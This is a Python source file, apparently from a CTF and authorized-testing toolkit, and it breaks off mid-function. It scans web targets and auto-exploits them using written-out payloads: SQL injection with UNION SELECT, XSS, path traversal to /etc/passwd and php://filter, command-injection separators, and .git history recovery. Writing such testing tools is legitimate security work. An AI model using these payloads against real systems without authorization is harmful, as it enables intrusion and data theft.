# -*- coding: utf-8 -*-
"""Web 安全模块

覆盖：SQL注入、XSS、LFI/RFI、命令注入、SSRF、目录扫描、HTTP头分析等。
用于授权安全测试和 CTF 竞赛环境。
"""

import re
import shlex
from typing import Optional
from urllib.parse import parse_qs, parse_qsl, urlencode, urljoin, urlparse, urlunparse

from ctftool.core.i18n import t

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class WebModule:
    """Web 安全工具集"""

    def __init__(self, timeout: int = 10, verify_ssl: bool = False,
                 user_agent: str = ""):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session() if HAS_REQUESTS else None
        if self.session:
            ua = user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
            self.session.headers.update({
                'User-Agent': ua
            })

    def _check_requests(self):
        if not HAS_REQUESTS:
            raise ImportError(t("web.need_requests"))

    def _get(self, url: str, **kwargs) -> 'requests.Response':
        self._check_requests()
        return self.session.get(url, timeout=self.timeout, verify=self.verify_ssl, **kwargs)

    def close(self):
        """关闭 HTTP 会话，释放连接"""
        if self.session:
            self.session.close()

    def _post(self, url: str, **kwargs) -> 'requests.Response':
        self._check_requests()
        return self.session.post(url, timeout=self.timeout, verify=self.verify_ssl, **kwargs)

    # ========== 请求上下文配置 ==========

    def configure(self, headers: dict = None, cookies: dict = None,
                  proxies: dict = None, auth: tuple = None):
        """配置 HTTP 请求上下文（自定义 headers/cookies/proxy/认证）"""
        if self.session:
            if headers:
                self.session.headers.update(headers)
            if cookies:
                self.session.cookies.update(cookies)
            if proxies:
                self.session.proxies = proxies
            if auth:
                self.session.auth = auth
        return t("web.context_configured")

    def parse_curl(self, curl_cmd: str) -> str:
        """解析 curl 命令并自动配置请求上下文

        支持解析: -H/--header, -b/--cookie, -d/--data, -X/--request,
        -x/--proxy, -u/--user, -A/--user-agent, --compressed, -k/--insecure
        """
        try:
            tokens = shlex.split(curl_cmd)
        except ValueError as e:
            return f"[-] {t('web.curl_parse_failed')}: {e}"

        url = None
        method = "GET"
        headers = {}
        cookies = {}
        data = None
        proxy = None
        auth = None
        insecure = False
        compressed = False

        i = 0
        while i < len(tokens):
            tok = tokens[i]

            if tok == 'curl':
                i += 1
                continue

            if tok in ('-H', '--header') and i + 1 < len(tokens):
                i += 1
                header_str = tokens[i]
                if ':' in header_str:
                    key, val = header_str.split(':', 1)
                    headers[key.strip()] = val.strip()
            elif tok in ('-b', '--cookie') and i + 1 < len(tokens):
                i += 1
                cookie_str = tokens[i]
                for part in cookie_str.split(';'):
                    part = part.strip()
                    if '=' in part:
                        ck, cv = part.split('=', 1)
                        cookies[ck.strip()] = cv.strip()
            elif tok in ('-d', '--data', '--data-raw', '--data-urlencode') and i + 1 < len(tokens):
                i += 1
                data = tokens[i]
                if method == "GET":
                    method = "POST"
            elif tok in ('-X', '--request') and i + 1 < len(tokens):
                i += 1
                method = tokens[i].upper()
            elif tok in ('-x', '--proxy') and i + 1 < len(tokens):
                i += 1
                proxy_url = tokens[i]
                proxy = {"http": proxy_url, "https": proxy_url}
            elif tok in ('-u', '--user') and i + 1 < len(tokens):
                i += 1
                user_str = tokens[i]
                if ':' in user_str:
                    u, p = user_str.split(':', 1)
                    auth = (u, p)
                else:
                    auth = (user_str, '')
            elif tok in ('-A', '--user-agent') and i + 1 < len(tokens):
                i += 1
                headers['User-Agent'] = tokens[i]
            elif tok in ('-k', '--insecure'):
                insecure = True
            elif tok == '--compressed':
                compressed = True
                headers.setdefault('Accept-Encoding', 'gzip, deflate, br')
            elif not tok.startswith('-') and url is None:
                url = tok

            i += 1

        # 应用配置
        if insecure:
            self.verify_ssl = False
        self.configure(headers=headers or None, cookies=cookies or None,
                       proxies=proxy, auth=auth)

        # 格式化输出摘要
        lines = [f"=== {t('web.curl_parse_result')} ==="]
        lines.append(f"  URL: {url or '(' + t('web.not_extracted') + ')'}")
        lines.append(f"  {t('web.method')}: {method}")
        lines.append(f"  Headers: {len(headers)} {t('web.count_unit')}")
        if headers:
            for k, v in headers.items():
                lines.append(f"    {k}: {v}")
        lines.append(f"  Cookies: {len(cookies)} {t('web.count_unit')}")
        if cookies:
            for k, v in cookies.items():
                lines.append(f"    {k}={v}")
        lines.append(f"  POST Data: {t('web.yes') if data else t('web.no')}")
        if data:
            lines.append(f"    {data[:200]}")
        lines.append(f"  Proxy: {proxy['http'] if proxy else t('web.no')}")
        lines.append(f"  Auth: {t('web.set') if auth else t('web.no')}")
        lines.append(f"  SSL {t('web.verify')}: {t('web.off') if insecure else t('web.on')}")
        lines.append(f"  {t('web.compression')}: {t('web.yes') if compressed else t('web.no')}")
        lines.append("")
        lines.append(f"[+] {t('web.config_applied')}")
        if data:
            lines.append(f"[*] {t('web.post_data_saved')}")

        return "\n".join(lines)

    # ========== HTTP 头分析 ==========

    def analyze_headers(self, url: str) -> str:
        """分析 HTTP 响应头，查找敏感信息"""
        try:
            resp = self._get(url)
        except Exception as e:
            return f"[-] {t('web.connect_fail')}: {e}"
        lines = [f"{t('web.status_code')}: {resp.status_code}", f"URL: {resp.url}", "", f"=== {t('web.response_headers')} ==="]
        for k, v in resp.headers.items():
            lines.append(f"  {k}: {v}")

        lines.append(f"\n=== {t('web.security_analysis')} ===")
        headers = {k.lower(): v for k, v in resp.headers.items()}

        # 检查安全头缺失
        security_headers = {
            'x-frame-options': f'X-Frame-Options ({t("web.anti_clickjacking")})',
            'x-content-type-options': f'X-Content-Type-Options ({t("web.anti_mime_sniffing")})',
            'x-xss-protection': f'X-XSS-Protection ({t("web.xss_filter")})',
            'strict-transport-security': f'HSTS ({t("web.force_https")})',
            'content-security-policy': f'CSP ({t("web.csp")})',
        }
        for header, desc in security_headers.items():
            if header not in headers:
                lines.append(f"  [!] {t('web.missing')} {desc}")
            else:
                lines.append(f"  [+] {t('web.present')} {desc}: {headers[header]}")

        # 敏感信息泄露
        if 'server' in headers:
            lines.append(f"  [!] Server {t('web.header_leak')}: {headers['server']}")
        if 'x-powered-by' in headers:
            lines.append(f"  [!] X-Powered-By {t('web.header_leak')}: {headers['x-powered-by']}")

        # 检查 Cookie 安全
        if 'set-cookie' in headers:
            cookie = headers['set-cookie']
            if 'httponly' not in cookie.lower():
                lines.append(f"  [!] Cookie {t('web.missing_httponly')}")
            if 'secure' not in cookie.lower():
                lines.append(f"  [!] Cookie {t('web.missing_secure')}")

        # 检查响应体中的信息泄露
        body = resp.text
        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        if comments:
            lines.append(f"\n=== {t('web.html_comments')} ===")
            for c in comments[:10]:
                lines.append(f"  <!-- {c.strip()[:200]} -->")

        return "\n".join(lines)

    # ========== 目录/文件扫描 ==========

    def check_robots(self, url: str) -> str:
        """检查 robots.txt 并自动访问发现的敏感路径"""
        from ctftool.core.flag_finder import flag_finder
        robots_url = urljoin(url, '/robots.txt')
        try:
            resp = self._get(robots_url)
        except Exception as e:
            return f"[-] {t('web.connect_fail')}: {e}"
        if resp.status_code != 200 or 'disallow' not in resp.text.lower():
            return f"[-] {t('web.no_robots')}"

        lines = [f"[+] {t('web.found_robots')}:", resp.text, ""]
        # 提取 Disallow/Allow 路径并自动访问
        paths = re.findall(r'(?:Disallow|Allow):\s*(\S+)', resp.text)
        if paths:
            lines.append(f"=== {t('web.auto_visit_paths')} ({len(paths)}) ===")
            for path in paths:
                if path == '/' or path == '':
                    continue
                try:
                    visit_url = urljoin(url, path)
                    vr = self._get(visit_url)
                    status = vr.status_code
                    size = len(vr.text)
                    lines.append(f"  [{status}] {path} ({size} bytes)")
                    # 检查 flag
                    flags = flag_finder.search(vr.text)
                    if flags:
                        lines.append(f"    [!] FLAG: {', '.join(flags)}")
                        lines.append(f"    {vr.text[:300]}")
                    elif status == 200 and size > 0:
                        lines.append(f"    {vr.text[:200]}")
                except Exception as e:
                    lines.append(f"  [ERR] {path}: {e}")
        return "\n".join(lines)

    def check_git_leak(self, url: str) -> str:
        """检查 .git 泄露并自动恢复历史 commit 中的文件（搜索 flag）"""
        import zlib

        from ctftool.core.flag_finder import flag_finder

        results = []
        git_found = False

        # 阶段1: 基础检测
        paths = ['/.git/HEAD', '/.git/config', '/.git/index']
        for path in paths:
            try:
                resp = self._get(urljoin(url, path))
                if resp.status_code == 200:
                    content = resp.text[:500]
                    if 'ref:' in content or '[core]' in content or len(resp.content) > 0:
                        results.append(f"[+] {t('web.found')} {path}: {content[:200]}")
                        git_found = True
            except Exception:
                pass

        if not git_found:
            return f"[-] {t('web.no_git_leak')}"

        results.insert(0, f"[!] {t('web.git_leak_detected')}")

        # 阶段2: 读取 git log 获取所有 commit hash
        commit_hashes = []
        try:
            log_resp = self._get(urljoin(url, '/.git/logs/HEAD'))
            if log_resp.status_code == 200:
                results.append("\n=== Git Log ===")
                for line in log_resp.text.strip().split('\n'):
                    results.append(f"  {line[:120]}")
                    # 提取 commit hash（每行格式: old_hash new_hash author timestamp message）
                    parts = line.split()
                    if len(parts) >= 2:
                        for h in parts[:2]:
                            if len(h) == 40 and h != '0' * 40 and h not in commit_hashes:
                                commit_hashes.append(h)
        except Exception:
            pass

        # 也从 refs 获取
        for ref_path in ['/.git/refs/heads/master', '/.git/refs/heads/main', '/.git/refs/stash']:
            try:
                ref_resp = self._get(urljoin(url, ref_path))
                if ref_resp.status_code == 200:
                    h = ref_resp.text.strip()
                    if len(h) == 40 and h not in commit_hashes:
                        commit_hashes.append(h)
            except Exception:
                pass

        if not commit_hashes:
            results.append(f"\n[-] {t('web.git_no_commits')}")
            return "\n".join(results)

        # 阶段3: 解析每个 commit 的 tree，读取所有 blob 搜索 flag
        def _get_git_object(obj_hash):
            try:
                obj_url = urljoin(url, f'/.git/objects/{obj_hash[:2]}/{obj_hash[2:]}')
                r = self._get(obj_url)
                if r.status_code == 200:
                    return zlib.decompress(r.content)
            except Exception:
                pass
            return None

        def _parse_tree(tree_data):
            """解析 tree 对象，返回 [(mode, name, hash), ...]"""
            entries = []
            # 跳过 header (tree NNN\0)
            null_pos = tree_data.find(b'\x00')
            if null_pos < 0:
                return entries
            content = tree_data[null_pos + 1:]
            pos = 0
            while pos < len(content):
                space = content.find(b' ', pos)
                if space < 0:
                    break
                null = content.find(b'\x00', space)
                if null < 0:
                    break
                mode = content[pos:space].decode('ascii', errors='replace')
                name = content[space + 1:null].decode('utf-8', errors='replace')
                if null + 21 > len(content):
                    break
                blob_hash = content[null + 1:null + 21].hex()
                entries.append((mode, name, blob_hash))
                pos = null + 21
            return entries

        found_flags = []
        visited_trees = set()

        results.append(f"\n=== {t('web.git_restore_history')} ({len(commit_hashes)} commits) ===")

        for commit_hash in commit_hashes:
            commit_data = _get_git_object(commit_hash)
            if not commit_data:
                continue
            commit_text = commit_data.decode('utf-8', errors='replace')
            # 提取 tree hash
            tree_match = re.search(r'tree ([a-f0-9]{40})', commit_text)
            if not tree_match:
                continue
            tree_hash = tree_match.group(1)
            if tree_hash in visited_trees:
                continue
            visited_trees.add(tree_hash)

            # 提取 commit message
            msg_match = re.search(r'\n\n(.+)', commit_text)
            msg = msg_match.group(1).strip() if msg_match else "?"
            results.append(f"\n  [{commit_hash[:8]}] {msg}")

            tree_data = _get_git_object(tree_hash)
            if not tree_data:
                continue

            entries = _parse_tree(tree_data)
            for mode, name, blob_hash in entries:
                results.append(f"    {mode} {name}")
                # 读取所有文本文件的 blob 内容
                blob_data = _get_git_object(blob_hash)
                if blob_data:
                    try:
                        blob_text = blob_data.decode('utf-8', errors='replace')
                        # 跳过 header
                        null_pos = blob_text.find('\x00')
                        if null_pos >= 0:
                            blob_text = blob_text[null_pos + 1:]
                        # 搜索 flag
                        flags = flag_finder.search(blob_text)
                        if flags:
                            for f in flags:
                                if f not in found_flags:
                                    found_flags.append(f)
                            results.append(f"      [!] FLAG: {', '.join(flags)}")
                            results.append(f"      {blob_text[:500]}")
                        elif any(kw in name.lower() for kw in ('flag', 'secret', 'key', 'pass', 'hint')):
                            results.append(f"      {blob_text[:300]}")
                    except Exception:
                        pass

        if found_flags:
            results.append(f"\n[!] {t('web.flags_found')} ({len(found_flags)}):")
            for f in found_flags:
                results.append(f"    {f}")

        return "\n".join(results)

    def dir_scan(self, url: str, wordlist: Optional[list[str]] = None) -> str:
        """敏感路径扫描（多线程，含基线去误报）"""
        import random
        import string
        from concurrent.futures import ThreadPoolExecutor, as_completed

        self._check_requests()
        if wordlist is None:
            wordlist = self._default_paths()

        # 基线检测：请求一个随机不存在的路径，记录其响应特征
        random_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=16)) + '.html'
        baseline_len = -1
        baseline_status = -1
        try:
            baseline_resp = self._get(urljoin(url, random_path))
            baseline_len = len(baseline_resp.content)
            baseline_status = baseline_resp.status_code
        except Exception:
            pass

        found = []

        def _check_path(path):
            try:
                target = urljoin(url, path)
                resp = self._get(target)
                if resp.status_code in (200, 301, 302, 403):
                    content_len = len(resp.content)
                    # 过滤与基线相同的响应（服务器对不存在路径返回统一页面）
                    if resp.status_code == baseline_status and content_len == baseline_len:
                        return None
                    return f"  [{resp.status_code}] {path} ({content_len} bytes)"
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(_check_path, path): path for path in wordlist}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)

        lines = []
        if baseline_status == 200:
            lines.append(f"[*] {t('web.baseline_info')}: {random_path} -> {baseline_status} ({baseline_len} bytes)")
            lines.append(f"[*] {t('web.baseline_filtered')}")
            lines.append("")
        if found:
            lines.append(f"{t('web.found_paths')} {len(found)}:")
            lines.extend(sorted(found))
        else:
            lines.append(f"[-] {t('web.no_sensitive_paths')}")
        return "\n".join(lines)

    # ========== 目录列表递归爬取 ==========

    def dir_listing_crawl(self, url: str, max_depth: int = 5) -> str:
        """递归爬取开放的目录列表（Index of）页面

        自动检测 Apache/Nginx 目录索引，递归遍历所有子目录，
        提取发现的文件列表，并自动读取可能包含 flag 的文件内容。
        """
        self._check_requests()
        from ctftool.core.flag_finder import flag_finder

        lines = [f"=== {t('web.dir_listing_title')} ===", f"URL: {url}", ""]
        found_files = []
        found_flags = []
        visited = set()

        def _is_dir_listing(text: str) -> bool:
            """检测页面是否是目录列表"""
            indicators = ['Index of', 'Directory listing', '<table>', 'Parent Directory',
                          '[DIR]', '[TXT]', 'href="?C=']
            return any(ind in text for ind in indicators)

        def _extract_entries(text: str, base_url: str) -> tuple:
            """从目录列表中提取子目录和文件"""
            dirs, files = [], []
            for match in re.findall(r'href="([^"?][^"]*)"', text):
                if match in ('/', '../') or match.startswith('http') or match.startswith('/icons'):
                    continue
                if match.startswith('/'):
                    continue
                if match.endswith('/'):
                    dirs.append(match)
                else:
                    files.append(match)
            return dirs, files

        def _crawl(current_url: str, path: str, depth: int):
            if depth > max_depth or current_url in visited:
                return
            visited.add(current_url)
            try:
                resp = self._get(current_url)
                if resp.status_code != 200:
                    return
                text = resp.text

                # 检查响应中是否直接包含 flag
                flag_matches = flag_finder.search(text)
                if flag_matches:
                    for f in flag_matches:
                        if f not in found_flags:
                            found_flags.append(f)
                            lines.append(f"  [!] FLAG {t('web.found_in')} {path}: {f}")

                if not _is_dir_listing(text):
                    return

                dirs, files = _extract_entries(text, current_url)

                # 处理文件
                for fname in files:
                    file_url = current_url.rstrip('/') + '/' + fname
                    file_path = path + fname
                    found_files.append(file_path)
                    # 自动读取可能含 flag 的文件
                    interesting = ('flag', 'secret', 'key', 'pass', 'hint', 'note',
                                   '.txt', '.php', '.bak', '.sql', '.conf', '.env',
                                   '.log', '.xml', '.json', '.yml', '.md')
                    if any(kw in fname.lower() for kw in interesting):
                        try:
                            fr = self._get(file_url)
                            content = fr.text[:2000]
                            lines.append(f"  [+] {file_path} ({len(fr.text)} bytes)")
                            # 检查 flag
                            file_flags = flag_finder.search(content)
                            if file_flags:
                                for f in file_flags:
                                    if f not in found_flags:
                                        found_flags.append(f)
                                lines.append(f"      [!] FLAG: {', '.join(file_flags)}")
                            lines.append(f"      {content[:300]}")
                        except Exception:
                            pass
                    else:
                        lines.append(f"  [-] {file_path}")

                # 递归子目录
                for dname in dirs:
                    sub_url = current_url.rstrip('/') + '/' + dname
                    _crawl(sub_url, path + dname, depth + 1)

            except Exception as e:
                lines.append(f"  [ERR] {path}: {e}")

        # 确保 URL 以 / 结尾
        if not url.endswith('/'):
            url = url + '/'

        # 先检查目标是否有目录列表
        try:
            resp = self._get(url)
            if not _is_dir_listing(resp.text):
                # 主页不是目录列表，尝试常见的开放目录路径
                common_dirs = ['/', '/upload/', '/uploads/', '/files/', '/static/',
                               '/backup/', '/data/', '/tmp/', '/images/', '/docs/']
                for d in common_dirs:
                    try:
                        test_url = urljoin(url, d)
                        r = self._get(test_url)
                        if r.status_code == 200 and _is_dir_listing(r.text):
                            lines.append(f"[+] {t('web.dir_listing_found')}: {d}")
                            _crawl(test_url, d, 0)
                    except Exception:
                        pass
                if not found_files and not found_flags:
                    lines.append(f"[-] {t('web.no_dir_listing')}")
            else:
                lines.append(f"[+] {t('web.dir_listing_found')}: {url}")
                _crawl(url, '/', 0)
        except Exception as e:
            lines.append(f"[-] {t('web.cannot_access_target')}: {e}")

        # 汇总
        lines.append(f"\n=== {t('web.summary')} ===")
        lines.append(f"{t('web.total_files')}: {len(found_files)}")
        lines.append(f"{t('web.total_dirs')}: {len(visited)}")
        if found_flags:
            lines.append(f"\n[!] {t('web.flags_found')} ({len(found_flags)}):")
            for f in found_flags:
                lines.append(f"    {f}")
        return "\n".join(lines)

    # ========== SQL 注入检测 ==========

    def detect_sqli(self, url: str, data: str = None) -> str:
        """SQL 注入检测"""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params and not data:
            return f"[-] {t('web.no_params_sqli')}\n{t('web.hint_provide_url')}"

        # Error-based 测试 payload
        sqli_payloads = [
            (t("web.sqli.single_quote"), "'"),
            (t("web.sqli.double_quote"), '"'),
            (t("web.sqli.or_true"), "' OR '1'='1"),
            (t("web.sqli.union_probe"), "' UNION SELECT NULL--"),
            (t("web.sqli.comment_truncate"), "' --"),
            (t("web.sqli.paren_close"), "') OR ('1'='1"),
            (t("web.sqli.int_overflow"), "1 OR 1=1"),
        ]

        # SQL 报错特征
        error_patterns = [
            r'SQL syntax',
            r'mysql_',
            r'ORA-\d{5}',
            r'PostgreSQL',
            r'SQLite',
            r'Warning.*mysql',
            r'Unclosed quotation mark',
            r'SQLSTATE',
            r'syntax error',
            r'Microsoft.*ODBC',
        ]

        # 获取原始响应作为基准
        try:
            baseline = self._get(url)
            baseline_len = len(baseline.text)
        except Exception as e:
            return f"[-] {t('web.cannot_access_target')}: {e}"

        vuln_found = False

        # 测试 URL 查询参数
        for param_name in params:
            results.append(f"\n=== {t('web.test_param')}: {param_name} ===")
            for payload_name, payload in sqli_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = self._get(test_url)
                    # 检查 SQL 报错
                    for pattern in error_patterns:
                        match = re.search(pattern, resp.text, re.IGNORECASE)
                        if match:
                            results.append(
                                f"  [!] {payload_name}: {t('web.sql_error_triggered')} - {match.group()}"
                            )
                            vuln_found = True
                            break
                    # 检查响应长度变化
                    diff = abs(len(resp.text) - baseline_len)
                    if diff > 100:
                        results.append(
                            f"  [?] {payload_name}: {t('web.resp_length_change')} {diff} bytes"
                        )
                except Exception:
                    pass

        # 测试 POST data 参数
        if data:
            post_params = parse_qsl(data)
            if post_params:
                for pname, pval in post_params:
                    results.append(f"\n=== {t('web.test_post_param')}: {pname} ===")
                    for payload_name, payload in sqli_payloads:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == pname:
                                modified_parts.append(f"{k}={payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        try:
                            resp = self._post(url, data=modified_data)
                            for pattern in error_patterns:
                                match = re.search(pattern, resp.text, re.IGNORECASE)
                                if match:
                                    results.append(
                                        f"  [!] {payload_name}: {t('web.sql_error_triggered')} - {match.group()}"
                                    )
                                    vuln_found = True
                                    break
                            diff = abs(len(resp.text) - baseline_len)
                            if diff > 100:
                                results.append(
                                    f"  [?] {payload_name}: {t('web.resp_length_change')} {diff} bytes"
                                )
                        except Exception:
                            pass

        # 自动利用: UNION SELECT 尝试
        if vuln_found:
            results.append(f"\n=== [*] {t('web.auto_exploit')}: UNION SELECT {t('web.probe')} ===")
            union_payloads = [
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            ]
            for upayload in union_payloads:
                for param_name in params:
                    test_params = params.copy()
                    test_params[param_name] = [upayload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))
                    try:
                        resp = self._get(test_url)
                        resp_text = resp.text
                        # 检查是否有有价值数据（表名等）
                        if any(kw in resp_text.lower() for kw in ['flag', 'user', 'admin', 'secret', 'password']):
                            results.append(f"  [!] {upayload[:50]}... -> {t('web.valuable_data_found')}")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:300]}")
                        elif len(resp_text) != baseline_len and 'error' not in resp_text.lower():
                            results.append(f"  [?] {upayload[:50]}... -> {t('web.resp_changed')} ({len(resp_text)} bytes)")
                    except Exception:
                        pass

        if not vuln_found and len(results) <= len(params):
            return f"[-] {t('web.no_sqli_found')}"
        return f"{t('web.sqli_result')}:\n" + "\n".join(results)

    # ========== XSS 检测 ==========

    def detect_xss(self, url: str, data: str = None) -> str:
        """XSS 反射检测"""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params and not data:
            return f"[-] {t('web.no_params_xss')}"

        xss_payloads = [
            (t("web.xss.basic_script"), "<script>alert(1)</script>"),
            ("IMG onerror", '<img src=x onerror=alert(1)>'),
            ("SVG onload", '<svg onload=alert(1)>'),
            (t("web.xss.event_handler"), '" onmouseover="alert(1)'),
            (t("web.xss.template_inject"), "{{7*7}}"),
            (t("web.xss.tag_probe"), "<xss>test</xss>"),
        ]

        # 测试 URL 查询参数
        for param_name in params:
            results.append(f"\n=== {t('web.test_param')}: {param_name} ===")
            for name, payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = self._get(test_url)
                    if payload in resp.text:
                        results.append(f"  [!] {name}: Payload {t('web.reflected_raw')}")
                    elif payload.replace('<', '&lt;') in resp.text:
                        results.append(f"  [-] {name}: Payload {t('web.html_encoded')}")
                except Exception:
                    pass

        # 测试 POST data 参数
        if data:
            post_params = parse_qsl(data)
            if post_params:
                for pname, pval in post_params:
                    results.append(f"\n=== {t('web.test_post_param')}: {pname} ===")
                    for name, payload in xss_payloads:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == pname:
                                modified_parts.append(f"{k}={payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        try:
                            resp = self._post(url, data=modified_data)
                            if payload in resp.text:
                                results.append(f"  [!] {name}: Payload 被原样反射!")
                            elif payload.replace('<', '&lt;') in resp.text:
                                results.append(f"  [-] {name}: Payload 被 HTML 编码")
                        except Exception:
                            pass

        return f"{t('web.xss_result')}:\n" + "\n".join(results)

    # ========== LFI 检测 ==========

    def detect_lfi(self, url: str, data: str = None) -> str:
        """本地文件包含检测"""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params and not data:
            return f"[-] {t('web.no_params_lfi')}"

        lfi_payloads = [
            ("Linux passwd", "../../../../etc/passwd"),
            ("Windows hosts", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"),
            (t("web.lfi.null_byte"), "../../../../etc/passwd%00"),
            (t("web.lfi.double_encode"), "..%252f..%252f..%252fetc/passwd"),
            (t("web.lfi.php_filter"), "php://filter/convert.base64-encode/resource=index"),
            (t("web.lfi.php_input"), "php://input"),
        ]

        lfi_signatures = [
            r'root:.*:0:0:',
            r'\[fonts\]',
            r'<\?php',
            r'PD9waHA',  # Base64 of <?php
        ]

        vuln_found = False
        vuln_param = None
        vuln_payload_prefix = None
        use_post = False

        # 测试 URL 查询参数
        for param_name in params:
            results.append(f"\n=== {t('web.test_param')}: {param_name} ===")
            for name, payload in lfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = self._get(test_url)
                    for sig in lfi_signatures:
                        if re.search(sig, resp.text):
                            results.append(f"  [!] {name}: {t('web.file_content_leak')}")
                            vuln_found = True
                            vuln_param = param_name
                            # 提取路径前缀（去掉实际文件路径部分）
                            if 'etc/passwd' in payload:
                                vuln_payload_prefix = payload.rsplit('etc/passwd', 1)[0]
                            break
                except Exception:
                    pass

        # 测试 POST data 参数
        if data:
            post_params = parse_qsl(data)
            if post_params:
                for pname, pval in post_params:
                    results.append(f"\n=== {t('web.test_post_param')}: {pname} ===")
                    for name, payload in lfi_payloads:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == pname:
                                modified_parts.append(f"{k}={payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        try:
                            resp = self._post(url, data=modified_data)
                            for sig in lfi_signatures:
                                if re.search(sig, resp.text):
                                    results.append(f"  [!] {name}: {t('web.file_content_leak')}")
                                    if not vuln_found:
                                        vuln_found = True
                                        vuln_param = pname
                                        use_post = True
                                        if 'etc/passwd' in payload:
                                            vuln_payload_prefix = payload.rsplit('etc/passwd', 1)[0]
                                    break
                        except Exception:
                            pass

        # 自动利用: 尝试读取 flag 文件
        if vuln_found and vuln_param and vuln_payload_prefix is not None:
            results.append(f"\n=== [*] {t('web.auto_exploit')}: {t('web.try_read_flag')} ===")
            flag_paths = ['/flag', '/flag.txt', '/root/flag.txt', '/home/ctf/flag.txt',
                          '/var/www/flag.txt', '/app/flag.txt', '/flag.php']
            for fpath in flag_paths:
                # 构造绝对路径或相对路径 payload
                flag_payload = vuln_payload_prefix + fpath.lstrip('/')
                try:
                    if use_post and data:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == vuln_param:
                                modified_parts.append(f"{k}={flag_payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        resp = self._post(url, data=modified_data)
                    else:
                        test_params = params.copy()
                        test_params[vuln_param] = [flag_payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))
                        resp = self._get(test_url)
                    resp_text = resp.text.strip()
                    if resp_text and resp.status_code == 200 and len(resp_text) > 0:
                        # 排除错误页面
                        if not any(kw in resp_text.lower() for kw in ['not found', '404', 'error', 'no such file']):
                            results.append(f"  [!] {fpath}: {t('web.possible_content')}")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:500]}")
                except Exception:
                    pass
            # 如果尝试了所有路径都没找到 flag 内容，给出提示
            if not any('possible_content' in r or 'flag{' in r.lower() for r in results[-len(flag_paths):] if isinstance(r, str)):
                results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
                results.append(f"      {t('web.try_custom_path')}")

        return f"{t('web.lfi_result')}:\n" + "\n".join(results)

    # ========== 命令注入检测 ==========

    def detect_cmdi(self, url: str, data: str = None) -> str:
        """命令注入检测"""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params and not data:
            return f"[-] {t('web.no_params_cmdi')}"

        # 使用时间延迟检测（更可靠）
        cmdi_payloads = [
            (t("web.cmdi.pipe"), "|id"),
            (t("web.cmdi.semicolon"), ";id"),
            (t("web.cmdi.backtick"), "`id`"),
            (t("web.cmdi.dollar_sub"), "$(id)"),
            (t("web.cmdi.and_chain"), "&& id"),
            (t("web.cmdi.or_chain"), "|| id"),
        ]

        cmd_signatures = [
            r'uid=\d+',
            r'gid=\d+',
            r'root',
            r'www-data',
        ]

        vuln_found = False
        vuln_param = None
        use_post = False

        # 测试 URL 查询参数
        for param_name in params:
            results.append(f"\n=== {t('web.test_param')}: {param_name} ===")
            for name, payload in cmdi_payloads:
                original_value = params[param_name][0] if params[param_name] else ""
                test_params = params.copy()
                test_params[param_name] = [original_value + payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = self._get(test_url)
                    for sig in cmd_signatures:
                        if re.search(sig, resp.text):
                            results.append(f"  [!] {name}: {t('web.possible_cmdi')}")
                            vuln_found = True
                            vuln_param = param_name
                            payload[0]  # 记住分隔符 (|, ;, etc.)
                            break
                except Exception:
                    pass

        # 测试 POST data 参数
        if data:
            post_params = parse_qsl(data)
            if post_params:
                for pname, pval in post_params:
                    results.append(f"\n=== {t('web.test_post_param')}: {pname} ===")
                    for name, payload in cmdi_payloads:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == pname:
                                modified_parts.append(f"{k}={v}{payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        try:
                            resp = self._post(url, data=modified_data)
                            for sig in cmd_signatures:
                                if re.search(sig, resp.text):
                                    results.append(f"  [!] {name}: {t('web.possible_cmdi')}")
                                    if not vuln_found:
                                        vuln_found = True
                                        vuln_param = pname
                                        use_post = True
                                    break
                        except Exception:
                            pass

        # 自动利用: 尝试读取 flag
        if vuln_found:
